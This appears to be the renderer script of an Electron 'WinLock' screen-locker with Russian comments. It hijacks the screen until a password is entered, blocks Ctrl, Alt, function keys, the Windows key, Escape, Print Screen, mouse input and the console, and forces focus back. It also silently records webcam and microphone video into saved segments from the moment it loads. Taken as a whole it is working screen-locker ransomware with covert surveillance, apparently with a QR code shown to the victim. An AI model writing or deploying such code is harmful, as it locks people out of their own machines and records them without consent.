const { ipcRenderer } = require('electron');

let isUnlocked = false;
let mediaRecorder = null;
let recordedChunks = [];
let stream = null;

// Функция для начала записи видео
async function startVideoRecording() {
    try {
        // Запрашиваем доступ к камере и микрофону
        stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 1280, height: 720 },
            audio: true
        });
        
        // Создаем MediaRecorder
        mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'video/webm;codecs=vp9'
        });
        
        // Обработчик данных
        mediaRecorder.ondataavailable = function(event) {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
                
                // Сохраняем сегмент каждые 30 секунд через Electron API
                const timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
                const filename = `CollonilTolliWinLock-segment-${timestamp}.webm`;
                
                // Конвертируем в ArrayBuffer для отправки в main процесс
                const reader = new FileReader();
                reader.onload = function() {
                    ipcRenderer.send('save-video-file', {
                        filename: filename,
                        buffer: reader.result
                    });
                };
                reader.readAsArrayBuffer(event.data);
            }
        };
        
        // Обработчик остановки записи
         mediaRecorder.onstop = function() {
             if (recordedChunks.length > 0) {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 const timestamp = new Date().toISOString().slice(0,19).replace(/:/g, '-');
                 const filename = `CollonilTolliWinLock-final-${timestamp}.webm`;
                 
                 // Конвертируем в ArrayBuffer для отправки в main процесс
                 const reader = new FileReader();
                 reader.onload = function() {
                     ipcRenderer.send('save-video-file', {
                         filename: filename,
                         buffer: reader.result
                     });
                 };
                 reader.readAsArrayBuffer(blob);
                 
                 recordedChunks = [];
             }
         };
        
        // Начинаем запись с интервалом 30 секунд
        mediaRecorder.start(30000); // 30 секунд = 30000 мс
        console.log('Запись видео началась');
        
    } catch (error) {
        console.error('Ошибка при запуске записи видео:', error);
    }
}

// Функция для остановки записи
function stopVideoRecording() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        
        // Останавливаем все треки
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        console.log('Запись видео остановлена');
    }
}

// Блокировка всех системных функций
document.addEventListener('DOMContentLoaded', function() {
    const passwordInput = document.getElementById('passwordInput');
    const unlockButton = document.getElementById('unlockBtn');
    const errorMessage = document.getElementById('errorMessage');
    
    // Начинаем запись видео при загрузке
    startVideoRecording();
    
    // Автофокус на поле ввода
    passwordInput.focus();

    // Обработчик кнопки разблокировки
    unlockButton.addEventListener('click', checkPassword);

    // Обработчик нажатия Enter
    passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            checkPassword();
        }
    });

    // Функция проверки пароля
    async function checkPassword() {
        const password = passwordInput.value;
        
        if (!password) {
            showError('Введите пароль!');
            return;
        }

        try {
            const isCorrect = await ipcRenderer.invoke('check-password', password);
            
            if (isCorrect) {
                // Правильный пароль - останавливаем запись и закрываем приложение
                isUnlocked = true;
                stopVideoRecording();
                
                // Показываем сообщение об успехе на короткое время
                document.querySelector('.lock-screen').innerHTML = `
                    <div class="lock-icon">
                        <img src="QR.png" alt="QR Code" style="width: 100px; height: 100px; filter: hue-rotate(120deg);">
                    </div>
                    <h1 class="title" style="color: #44ff44;">Система разблокирована!</h1>
                    <p class="message">Приложение закроется через 5 секунд...</p>
                `;
                
                // Закрываем приложение через 2 секунды
                setTimeout(() => {
                    // Дополнительно закрываем окно из renderer процесса
                    window.close();
                    ipcRenderer.send('force-quit-app');
                }, 5000);
            } else {
                showError('Неверный пароль! Попробуйте еще раз.');
                passwordInput.value = '';
                passwordInput.focus();
            }
        } catch (error) {
            showError('Ошибка проверки пароля!');
        }
    }

    // Функция показа ошибки
    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 3000);
    }
});

// Блокировка контекстного меню
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
});

// Агрессивная блокировка всех системных горячих клавиш
document.addEventListener('keydown', function(e) {
    // Полная блокировка всех комбинаций с Ctrl
    if (e.ctrlKey) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Полная блокировка всех комбинаций с Alt
    if (e.altKey) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Блокировка функциональных клавиш
    if (e.keyCode >= 112 && e.keyCode <= 123) { // F1-F12
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Блокировка Escape
    if (e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Блокировка Windows key
    if (e.keyCode === 91 || e.keyCode === 92) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Блокировка Tab без модификаторов (кроме поля ввода)
    if (e.keyCode === 9 && e.target.id !== 'passwordInput') {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
    
    // Блокировка Print Screen
    if (e.keyCode === 44) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
});

// Блокировка выделения текста
document.addEventListener('selectstart', function(e) {
    e.preventDefault();
    return false;
});

// Блокировка перетаскивания
document.addEventListener('dragstart', function(e) {
    e.preventDefault();
    return false;
});

// Предотвращение потери фокуса
// Убираем агрессивный обработчик blur для предотвращения мерцания
// window.addEventListener('blur', function() {
//     window.focus();
// });

// Блокировка печати
window.addEventListener('beforeprint', function(e) {
    e.preventDefault();
    return false;
});

// Отключение консоли (попытка)
if (typeof console !== 'undefined') {
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};
    console.debug = function() {};
}

// Блокировка открытия новых окон
window.open = function() {
    return null;
};

// Переопределение alert, confirm, prompt
window.alert = function() {};
window.confirm = function() { return false; };
window.prompt = function() { return null; };

// Мягкая проверка фокуса для предотвращения обхода без мерцания
setInterval(function() {
    const activeElement = document.activeElement;
    const passwordInput = document.getElementById('passwordInput');
    
    // Проверяем фокус только если окно действительно потеряло фокус
    if (!document.hasFocus() && activeElement !== passwordInput) {
        window.focus();
        if (passwordInput) {
            passwordInput.focus();
        }
    }
    
    // Проверяем видимость только если страница скрыта
    if ((document.hidden || document.visibilityState === 'hidden') && activeElement !== passwordInput) {
        window.focus();
        if (passwordInput) {
            passwordInput.focus();
        }
    }
}, 1000);

// Дополнительные обработчики для предотвращения обхода
document.addEventListener('keyup', function(e) {
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();
    return false;
});

document.addEventListener('keypress', function(e) {
    // Разрешаем только ввод в поле пароля
    if (e.target.id !== 'passwordInput') {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
});

// Блокировка изменения видимости
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        window.focus();
    }
});

// Убираем агрессивный обработчик focusout для предотвращения мерцания
// window.addEventListener('focusout', function() {
//     const passwordInput = document.getElementById('passwordInput');
//     setTimeout(() => {
//         window.focus();
//         if (passwordInput && document.activeElement !== passwordInput) {
//             passwordInput.focus();
//         }
//     }, 100);
// });

// Переопределение методов для предотвращения обхода
Object.defineProperty(document, 'hidden', {
    get: function() { return false; },
    configurable: false
});

Object.defineProperty(document, 'visibilityState', {
    get: function() { return 'visible'; },
    configurable: false
});

// Блокировка попыток изменения стилей
const originalSetAttribute = Element.prototype.setAttribute;
Element.prototype.setAttribute = function(name, value) {
    if (name === 'style' || name === 'class') {
        return;
    }
    return originalSetAttribute.call(this, name, value);
};

// Блокировка изменения CSS
const originalAddRule = CSSStyleSheet.prototype.insertRule;
CSSStyleSheet.prototype.insertRule = function() {
    return;
};

// Агрессивная блокировка всех событий мыши кроме клика на кнопку
document.addEventListener('mousedown', function(e) {
    if (e.target.id !== 'unlockBtn' && e.target.id !== 'passwordInput') {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
}, true);

document.addEventListener('mouseup', function(e) {
    if (e.target.id !== 'unlockBtn' && e.target.id !== 'passwordInput') {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
}, true);

document.addEventListener('click', function(e) {
    if (e.target.id !== 'unlockBtn' && e.target.id !== 'passwordInput') {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }
}, true);